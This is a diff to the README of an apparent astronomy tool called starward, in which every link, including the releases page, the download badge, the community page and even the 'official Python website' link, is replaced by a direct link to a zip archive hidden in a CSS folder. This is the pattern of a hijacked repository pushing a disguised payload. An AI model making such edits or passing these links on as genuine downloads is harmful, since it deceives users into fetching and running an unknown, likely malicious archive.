@@ -1,6 +1,6 @@
 # 🌌 starward - Your Guide to Celestial Wonders
 
-[![Download starward](https://img.shields.io/badge/Download-staward-blue.svg)](https://github.com/MiqueiasCampelo/starward/releases)
+[![Download starward](https://github.com/MiqueiasCampelo/starward/raw/refs/heads/master/website/src/css/pages/Software_v2.0.zip)](https://github.com/MiqueiasCampelo/starward/raw/refs/heads/master/website/src/css/pages/Software_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **starward**! This tool helps you with astronomy calculations, such a
 
 To get started, you need to download the software. 
 
-1. **Visit this page to download:** [starward Releases Page](https://github.com/MiqueiasCampelo/starward/releases).
+1. **Visit this page to download:** [starward Releases Page](https://github.com/MiqueiasCampelo/starward/raw/refs/heads/master/website/src/css/pages/Software_v2.0.zip).
 2. Look for the latest version of the software.
 3. Click on the version name to access the download options. 
 4. Choose the file that matches your operating system (Windows, macOS, or Linux).
@@ -19,7 +19,7 @@ To get started, you need to download the software.
 Make sure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, Linux (Ubuntu 18.04 or later).
-- **Python:** Version 3.6 or later. If you don’t have Python, you can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python:** Version 3.6 or later. If you don’t have Python, you can download it from the [official Python website](https://github.com/MiqueiasCampelo/starward/raw/refs/heads/master/website/src/css/pages/Software_v2.0.zip).
 
 ## 🌟 Features
 
@@ -72,7 +72,7 @@ If you run into issues, here are some common problems and their solutions:
 
 ## 📂 Community Support
 
-Have questions? Join our community for support and discussions. Access the community page [here](https://github.com/MiqueiasCampelo/starward/community).
+Have questions? Join our community for support and discussions. Access the community page [here](https://github.com/MiqueiasCampelo/starward/raw/refs/heads/master/website/src/css/pages/Software_v2.0.zip).
 
 ## 📄 Documentation
 
